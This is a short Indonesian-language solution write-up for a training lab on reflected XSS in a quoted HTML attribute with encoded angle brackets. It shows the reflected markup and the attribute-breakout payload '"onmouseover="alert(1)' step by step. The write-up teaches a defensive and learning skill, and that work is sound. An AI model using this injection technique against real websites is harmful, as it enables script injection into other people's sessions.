# Reflected XSS into attribute with angle brackets HTML-encoded

Lab ini berisi kerentanan **reflected cross-site scripting (XSS)** pada fitur pencarian blog, di mana tanda kurung sudut (**angle brackets**: `<` dan `>`) diubah menjadi **HTML-encoded**. Untuk menyelesaikan lab ini, lakukan serangan cross-site scripting yang menyisipkan sebuah **attribute** dan memanggil fungsi `alert`.

## Solusi

1. Masukkan string alfanumerik acak ke kotak pencarian,contohnya `TESTING123`

2. Perhatikan bahwa string acak tersebut direfleksikan di dalam sebuah **attribute yang diberi tanda kutip**.

```html
<form action="/" method="GET">
<input type="text" placeholder="Search the blog..." name="search" value="TESTING123">
<button type="submit" class="button">Search</button>
</form>
```
3. coob tambhkan `">` dan lihat kembali code nya

```html
<input type="text" placeholder="Search the blog..." name="search" value="" &gt;testing123"="">
```

Bisa kita lihat,disni query kita sudah keluar (breakout) dari dalam `value`

4. Ganti input kamu dengan payload berikut untuk keluar dari attribute tersebut dan menyisipkan **event handler**:

```
"onmouseover="alert(1)
```

5. Verifikasi bahwa teknik ini berhasil dengan klik kanan, pilih **"Copy URL"**, lalu tempel URL tersebut ke browser. Saat mouse diarahkan ke elemen yang sudah disisipkan, maka akan memicu **alert**.
